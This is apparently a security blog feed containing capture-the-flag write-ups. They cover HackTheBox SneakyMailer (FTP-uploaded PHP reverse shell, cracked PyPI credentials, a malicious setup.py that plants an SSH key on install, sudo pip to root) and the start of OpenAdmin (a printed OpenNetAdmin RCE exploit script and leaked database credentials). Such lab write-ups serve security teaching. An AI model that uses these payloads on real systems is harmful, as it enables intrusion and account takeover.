<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt="540344afea7f42debd7cdc36f3fadd32" style="zoom:67%;" /></p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
<p><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt="f11b8bd4b2934eb892f681d23a369cdd" style="zoom:67%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt="f761f7b9b264477ebae8d690c347cbef" style="zoom:67%;" /></p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt="cea046ccdffc4e0f83620407c53726d5" style="zoom: 67%;" /></p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">211-FTP server status:
     Connected to ::ffff:10.10.14.20
     Logged in as developer
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is <span class="m">300</span>
     Control connection is plain text
     Data connections will be plain text
     At session startup, client count was <span class="m">1</span>
     vsFTPd 3.0.3 - secure, fast, stable
ftp&gt; <span class="nb">cd</span> /dev
<span class="m">250</span> Directory successfully changed.
ftp&gt; put /shares/reversef.php iamf.php
local: /shares/reversef.php remote: iamf.php
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Ok to send data.
<span class="m">226</span> Transfer complete.
<span class="m">72</span> bytes sent in 0.00 secs <span class="o">(</span>2.8610 MB/s<span class="o">)</span>
</code></pre></div><p>At first I thought it was on <code>http://sneakycorp.htb/iamf.php</code>, the uploaded shell was available on <code>http://dev.sneakycorp.htb/iamf.php</code>, so I&rsquo;ll have to add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ curl -s http://dev.sneakycorp.htb/iamf.php
</code></pre></div><p>The listener has an interactive shell now.</p>
<p><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt="43276abaf55b4760822901631d8c21de" style="zoom:67%;" /></p>
<p>After gaining access to the box, I can re-enumerate and search for files containing sensitive data.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><img src="imgs/image-20210429003013735.png" alt="image-20210429003013735" style="zoom: 67%;" /></p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><img src="imgs/image-20210429003321320.png" alt="image-20210429003321320" style="zoom:67%;" /></p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><img src="imgs/image-20210429003613068.png" alt="image-20210429003613068" style="zoom:67%;" /></p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking into the web configuration file, <code>pypi.sneakycorp.htb</code> is accessible on <code>localhost:5000</code>.</p>
<p><img src="imgs/image-20210429005849918.png" alt="image-20210429005849918" style="zoom: 67%;" /></p>
<p>It is also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><img src="imgs/image-20210429005829551.png" alt="image-20210429005829551" style="zoom:67%;" /></p>
<p>Remember about the second email Paul sent to user law?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
</code></pre></div><p>Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">setuptools</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;README.md&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s2">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span><span class="p">,</span> <span class="c1"># Replace with your own username</span>
    <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
    <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
    <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
    <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
    <span class="n">long_description</span><span class="o">=</span><span class="n">long_description</span><span class="p">,</span>
    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
    <span class="n">project_urls</span><span class="o">=</span><span class="p">{</span>
        <span class="s2">&#34;Bug Tracker&#34;</span><span class="p">:</span> <span class="s2">&#34;https://github.com/pypa/sampleproject/issues&#34;</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
    <span class="p">],</span>
    <span class="n">package_dir</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;&#34;</span><span class="p">:</span> <span class="s2">&#34;src&#34;</span><span class="p">},</span>
    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(</span><span class="n">where</span><span class="o">=</span><span class="s2">&#34;src&#34;</span><span class="p">),</span>
    <span class="n">python_requires</span><span class="o">=</span><span class="s2">&#34;&gt;=3.6&#34;</span><span class="p">,</span>
<span class="p">)</span>
</code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">setuptools</span>
<span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/home/low/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span><span class="p">)</span>
        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">pass</span>
<span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
        <span class="n">name</span><span class="o">=</span><span class="s2">&#34;low&#34;</span><span class="p">,</span>
        <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
        <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
        <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
        <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
        <span class="n">long_description</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
     <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
     <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(),</span>
     <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
     <span class="p">],</span>
<span class="p">)</span>
</code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="p">[</span><span class="nx">distutils</span><span class="p">]</span>
<span class="nx">index-servers</span> <span class="p">=</span>
 <span class="nx">local</span>
 
<span class="p">[</span><span class="nx">local</span><span class="p">]</span>
<span class="nx">repository</span><span class="err">:</span> <span class="nx">http</span><span class="err">://</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">5000</span>
<span class="nx">username</span><span class="err">:</span> <span class="nx">pypi</span>
<span class="nx">password</span><span class="err">:</span> <span class="nx">soufianeelhaoui</span>
</code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="p">[</span><span class="nx">distutils</span><span class="p">]</span>
<span class="nx">index-servers</span> <span class="p">=</span>
 <span class="nx">remote</span>
 
<span class="p">[</span><span class="nx">remote</span><span class="p">]</span>
<span class="nx">repository</span><span class="err">:</span> <span class="nx">http</span><span class="err">://</span><span class="nx">pypi</span><span class="p">.</span><span class="nx">sneakycorp</span><span class="p">.</span><span class="nx">htb</span><span class="err">:</span><span class="mi">8080</span>
<span class="nx">username</span><span class="err">:</span> <span class="nx">pypi</span>
<span class="nx">password</span><span class="err">:</span> <span class="nx">soufianeelhaoui</span>
</code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.42» 
$ python3 -m http.server <span class="m">80</span>
Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:12<span class="o">]</span> <span class="s2">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span class="m">200</span> -
10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:29<span class="o">]</span> <span class="s2">&#34;GET /setup.py HTTP/1.1&#34;</span> <span class="m">200</span> -
</code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
www-data@sneakymailer:/dev/shm$ 
www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">.
├── .pypirc
├── iamf.php
└── setup.py
</code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ <span class="nb">export</span> <span class="nv">$HOME</span><span class="o">=</span>/dev/shm
www-data@sneakymailer:~$
</code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@sneakymailer:~$ python3 setup.py sdist upload -r <span class="nb">local</span>
running sdist
running egg_info
writing low.egg-info/PKG-INFO
writing dependency_links to low.egg-info/dependency_links.txt
writing top-level names to low.egg-info/top_level.txt
reading manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
writing manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
running check
creating low-0.0.1
creating low-0.0.1/low.egg-info
copying files to low-0.0.1…
copying setup.py -&gt; low-0.0.1
copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
Writing low-0.0.1/setup.cfg
Creating tar archive
removing <span class="s1">&#39;low-0.0.1&#39;</span> <span class="o">(</span>and everything under it<span class="o">)</span>
running upload
Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Uploading via this <span class="nb">command</span> is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ ssh -i id_ecdsa low@10.10.10.197
</code></pre></div><p><img src="imgs/image-20210429021145269.png" alt="image-20210429021145269" style="zoom:67%;" /></p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><img src="imgs/image-20210429021533891.png" alt="image-20210429021533891" style="zoom: 67%;" /></p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">low@sneakymailer:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
low@sneakymailer:~$
low@sneakymailer:~$ <span class="nb">echo</span> <span class="s1">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; <span class="nv">$TF</span>/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install <span class="nv">$TF</span>
</code></pre></div><p><img src="imgs/image-20210429021914961.png" alt="image-20210429021914961" style="zoom:67%;" /></p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$
low@sneakymailer:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
low@sneakymailer:~$
low@sneakymailer:~$ sudo pip3 install $TF
sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.9ShSegy5bm
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - OpenAdmin</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</link>
      <pubDate>Fri, 02 Apr 2021 04:25:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/</guid>
      <description>Exploiting OpenNetAdmin vulnerability and sudo nano</description>
      <content:encoded><![CDATA[<p>OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally. The internal web has a logic flaw that allows me to obtain the SSH key of the second user. The second user is allowed to run a <code>nano</code> editor with sudo privileges, and this can be abused to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>OpenNetAdmin 18.1.1 exploitation</li>
<li>Exploiting sudo privileges on nano</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Dirb - Preinstalled in Kali Linux</li>
<li>John The Ripper - <a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ nmap -sV -sC -oA OpenAdmin <span class="s1">&#39;10.10.10.171&#39;</span> -v
</code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all formats</li>
<li><code>-v</code>, verbose mode</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>From the scan results, <code>nmap</code> found two open ports:</p>
<ul>
<li>An SSH service running on port 22</li>
<li>An HTTP service running on port 80</li>
</ul>
<p>Also, from the scan above, the machine is likely running Ubuntu.</p>
<p>As SSH usually requires valid credentials and there&rsquo;s is no straight exploit yet, hence further enumeration is needed.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP  80 - Website</h3>
<p>Visiting the standard http port only displays the Apache default page.</p>
<p><img class="img-container" src="imgs/4fb96d89a99c4244bb54291abd974267.png" alt="1ad0727e5956f0800cbe4ec0c02df451.png"  />
</p>
<h4 id="directory-brute-force---dirb">Directory Brute Force - dirb</h4>
<p>Running  <code>dirb</code>  against the web successfully discovered a few hidden paths.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «openadmin» «10.10.14.7»
$ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r
...&lt;SNIP&gt;...
---- Scanning URL: http://10.10.10.171/ ----
<span class="o">==</span>&gt; DIRECTORY: http://10.10.10.171/artwork/
+ http://10.10.10.171/index.html<span class="o">(</span>CODE:200<span class="p">|</span>SIZE:10918<span class="o">)</span> 
<span class="o">==</span>&gt; DIRECTORY: http:/10.10.10.171/music/
+ http://10.10.10.171/server-status <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:278<span class="o">)</span>
...&lt;SNIP&gt;...
</code></pre></div><h4 id="artwork">/artwork/</h4>
<p>Nothing here.</p>
<p><img class="img-container" src="imgs/image-20210402000812490.png" alt="image-20210402000812490"  />
</p>
<h4 id="music">/music/</h4>
<p>The <code>/music</code> home page provides a login menu that points to <code>http://openadmin.htb/ona</code></p>
<p><img class="img-container" src="imgs/image-20210402000847660.png" alt="image-20210402000847660"  />
</p>
<h4 id="ona">/ona/</h4>
<p>Visiting <code>/ona/</code> brings me to an instance of OpenNetAdmin. It is a software for managing network related things.</p>
<p><img class="img-container" src="imgs/88b4ba1460574b0f88a4acd81e00d392.png" alt="f0df4d83acc69be1e666eb6e40a73494.png"  />
</p>
<p>There&rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (<code>v18.1.1</code>)</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="opennetadmin-1811-rce">OpenNetAdmin 18.1.1 RCE</h4>
<p>Based on the version above, a quick search on <code>exploit-db</code> shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The <a href="https://www.exploit-db.com/exploits/47691">exploit PoC</a> source code is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="nv">URL</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">&#34;</span>
<span class="k">while</span> true<span class="p">;</span><span class="k">do</span>
 <span class="nb">echo</span> -n <span class="s2">&#34;</span>$<span class="s2"> &#34;</span><span class="p">;</span> <span class="nb">read</span> cmd
 curl --silent -d <span class="s2">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span class="si">${</span><span class="nv">cmd</span><span class="si">}</span><span class="s2">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">URL</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> sed -n -e <span class="s1">&#39;/BEGIN/,/END/ p&#39;</span> <span class="p">|</span> tail -n +2 <span class="p">|</span> head -n -1
<span class="k">done</span>
</code></pre></div><p>I saved the exploit to a file called <code>OpenRCE.sh</code>. I ran the exploit and it resulted in a shell access as www-data</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «openadmin» «10.10.14.7» 
$ ./OpenRCE.sh http://10.10.10.171/ona/
$ id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
$ hostname
openadmin
$ ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc mq state UP group default qlen <span class="m">1000</span>
    link/ether 00:50:56:b9:72:3a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:723a/64 scope global dynamic mngtmpaddr 
       valid_lft 86350sec preferred_lft 14350sec
    inet6 fe80::250:56ff:feb9:723a/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jimmy">Shell as jimmy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Upon enumerating the current working directory, a database credential is found in <code>./local/config/database_settings.inc.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ cat ./local/config/database_settings.inc.php
&lt;?php

<span class="nv">$ona_contexts</span><span class="o">=</span>array <span class="o">(</span>
  <span class="s1">&#39;DEFAULT&#39;</span> <span class="o">=</span>&gt; 
  array <span class="o">(</span>
    <span class="s1">&#39;databases&#39;</span> <span class="o">=</span>&gt; 
    array <span class="o">(</span>
      <span class="nv">0</span> <span class="o">=</span>&gt; 
      array <span class="o">(</span>
        <span class="s1">&#39;db_type&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysqli&#39;</span>,
        <span class="s1">&#39;db_host&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;localhost&#39;</span>,
        <span class="s1">&#39;db_login&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;ona_sys&#39;</span>,
        <span class="s1">&#39;db_passwd&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;n1nj4W4rri0R!&#39;</span>,
        <span class="s1">&#39;db_database&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;ona_default&#39;</span>,
        <span class="s1">&#39;db_debug&#39;</span> <span class="o">=</span>&gt; false,
      <span class="o">)</span>,
    <span class="o">)</span>,
    <span class="s1">&#39;description&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;Default data context&#39;</span>,
    <span class="s1">&#39;context_color&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;#D3DBFF&#39;</span>,
  <span class="o">)</span>,
<span class="o">)</span><span class="p">;</span>
</code></pre></div><h4 id="ssh-access">SSH access</h4>
<p>The password worked for user <code>jimmy</code>, but the user flag can not be found in <code>jimmy</code>’s home directory.</p>
<p><img class="img-container" src="imgs/25ec2fca7eb84dad9f748aeb299ef35b.png" alt="a0518e175f0d68951eac7bbb348b24e0.png"  />
</p>
<h3 id="shell-as-joanna">Shell as joanna</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>The <code>find</code> command is issued again to search files that is accessible or owned by user <code>jimmy</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ find / -type f -user jimmy 2&gt;/dev/null

...&lt;SNIP&gt;...
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/login.php
...&lt;SNIP&gt;...
</code></pre></div><p>It successfully reveals that user <code>jimmy</code> has access to files in <code>/var/www/internal/</code>.</p>
<p>Based on apache config, <code>/var/www/internal</code> is currently hosted locally on port 52846.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

&lt;VirtualHost 127.0.0.1:52846&gt;
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

&lt;IfModule mpm_itk_module&gt;
AssignUserID joanna joanna
&lt;/IfModule&gt;

    ErrorLog <span class="si">${</span><span class="nv">APACHE_LOG_DIR</span><span class="si">}</span>/error.log
    CustomLog <span class="si">${</span><span class="nv">APACHE_LOG_DIR</span><span class="si">}</span>/access.log combined

&lt;/VirtualHost&gt;
</code></pre></div><h4 id="code-review---improper-redirection">Code review - Improper redirection</h4>
<p>After inspecting the <code>main.php</code> source code from <code>/var/www/internal/</code>, a logic flaw was found on the first line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jimmy@openadmin:/var/www/internal/$ cat main.php

&lt;?php session_start<span class="o">()</span><span class="p">;</span> <span class="k">if</span> <span class="o">(</span>!isset <span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]))</span> <span class="o">{</span> header<span class="o">(</span><span class="s2">&#34;Location: /index.php&#34;</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> 
